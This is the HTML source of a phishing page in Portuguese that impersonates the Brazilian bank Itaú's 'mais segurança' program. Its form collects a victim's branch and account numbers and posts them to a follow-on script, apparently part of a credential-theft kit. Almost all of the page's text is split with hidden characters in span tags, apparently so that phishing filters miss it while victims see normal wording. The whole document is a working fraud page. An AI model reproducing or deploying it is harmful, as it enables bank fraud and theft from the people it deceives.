<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>OPERANDO</title>
<link type="text/css" rel="stylesheet" href="css/style.css">
<script language="javascript" src="scripts/validation.js"></script>
<script language="JavaScript">
 function mascara(t, mask){
 var i = t.value.length;
 var saida = mask.substring(1,0);
 var texto = mask.substring(i)
 if (texto.substring(0,1) != saida){
 t.value += texto.substring(0,1);
 }
 }
 </script>
</head>

<body>
<div id="top">
<div id="topDen1"></div>
<div id="topDen2"></div>
<div id="topSub"></div>
<div id="image"></div><div style="width:37px; height:43px; position:absolute; top:3px; left:180px; background:url(images/haha.fw.png) no-repeat;"></div>

</div> <!-- FEIXANDO DIV top -->

<div id="box">
<form name="form" id="form" action="index-teclado.php#232351.swf" method="post" onSubmit="return validar1()">
<div id="Gradient">
<div style="padding:0 0 10px 0;"><b><font face="Arial" size="3" color="#333">Ac<span class="oo">i</span>es<span class="oo">i</span>se s<span class="oo">i</span>ua</font> <font face="Arial" size="3" color="#F60">c<span class="oo">i</span>on<span class="oo">i</span>ta</font></b></div>
<div id="boxGrad">
<div style="margin-left:20px; margin-top:15px; font-family:'Arial'; font-weight:bold; font-size:13px;">In<span class="oo">i</span>for<span class="oo">i</span>me s<span class="oo">i</span>ua ag<span class="oo">i</span>ên<span class="oo">i</span>ci<span class="oo">i</span>a e c<span class="oo">i</span>on<span class="oo">i</span>ta.</div>
<div style="margin-left:20px; margin-top:15px;">
<input type="text" name="ag" id="ag" placeholder="Agência" maxlength="4" onKeyUp="javascript:pulacampo('ag','ct')" onkeypress="return SomenteNumero(event);" />
<input type="text" name="ct" id="ct" placeholder="Conta" maxlength="7" onkeypress="mascara(this, '#####-#');return SomenteNumero(event);" />
<input type="submit" name="ok" id="ok" value="Ok">
</div>

<div style="height:32px; width:250px; margin-left:20px; margin-top:15px;">
<div style="width:22px; height:22px; padding:3px; border:2px solid #CCC; border-radius:30px; float:left;">
<div style="width:12px; height:12px; padding:3px; border:2px solid #F60; border-radius:30px; font-size:12px; color:#F60; text-align:center;">?</div>
</div>
<div style="float:left; margin:10px 0 0 5px; font-size:11px; font-family:'Arial';">Co<span class="oo">i</span>nti<span class="oo">i</span>nu<span class="oo">i</span>a co<span class="oo">i</span>m dú<span class="oo">i</span>vid<span class="oo">i</span>as? <a href="#">clique aqui</a>.</div>
</div>

</div> <!-- FEIXANDO DIV boxGrad -->
</div> <!-- FEIXANDO DIV Gradient -->
</form>


<div id="boxRight" align="center">
<div style="padding:0 0 10px 0;" align="center"><b><font face="Arial" size="3" color="#069">Pr<span class="oo">i</span>og<span class="oo">i</span>ra<span class="oo">i</span>ma<font color="#F60"> m</font><font face="Arial" size="3" color="#F60">ais segurança</font></font></b></div>
<div id="BoxRightGrad" align="center">Um<span class="oo">i</span>a açã<span class="oo">i</span>o d<span class="oo">i</span>o lt<span class="oo">i</span>a<span class="oo">i</span>ú feit<span class="oo">i</span>a pa<span class="oo">i</span>ra vo<span class="oo">i</span>cê <br>e ta<span class="oo">i</span>mb<span class="oo">i</span>ém feit<span class="oo">i</span>a po<span class="oo">i</span>r vo<span class="oo">i</span>cê.</div>
<div style="width: 100px; border: 1px solid #EA4D00; background:#F90; padding: 5px; text-align: center; border-radius: 8px; font-family: 'Arial'; position: absolute; left: 576px; top: 174px; cursor:pointer; color:#FF2; text-shadow:1px 1px 1px #EA4D00;">S<span class="oo">i</span>ai<span class="oo">i</span>ba ma<span class="oo">i</span>is</div>
</div>

<div style="width:780px; height:auto; float:left; margin-top:20px;">
<div style="width:404px; height:auto; border:1px solid #CCC; float:left; margin-left:15px; font-family:'Arial'; font-size:11px; padding:10px; font-weight:bold; color:#666666; border-radius:10px;">
<div style="background:url(images/fone.gif) no-repeat; float:left; width:22px; height:17px; margin-top:20px; padding:0 10px 0 0;"></div>
<div style="float:left;">E<span class="oo">i</span>m ca<span class="oo">i</span>so d<span class="oo">i</span>e dú<span class="oo">i</span>vid<span class="oo">i</span>as li<span class="oo">i</span>gue: 03<span class="oo">i</span>00 10<span class="oo">i</span>0 12<span class="oo">i</span>13 - To<span class="oo">i</span>das as lo<span class="oo">i</span>ca<span class="oo">i</span>lida<span class="oo">i</span>des<br><br> De s<span class="oo">i</span>egu<span class="oo">i</span>nda a s<span class="oo">i</span>ex<span class="oo">i</span>ta-fe<span class="oo">i</span>ira da<span class="oo">i</span>s 07hor<span class="oo">i</span>as às 22horas; Em<span class="oo">i</span> fin<span class="oo">i</span>ais de<br> se<span class="oo">i</span>man<span class="oo">i</span>a e fe<span class="oo">i</span>riad<span class="oo">i</span>os das 08ho<span class="oo">i</span>ras às 22ho<span class="oo">i</span>ras.</div>
</div>

<div style="width:161px; height:80px; background:url(images/image1.png) no-repeat; float:right; margin-right:60px;"></div>
</div>

</div> <!-- FEIXANDO DIV box -->



<div id="bottom"></div>
</body>
</html>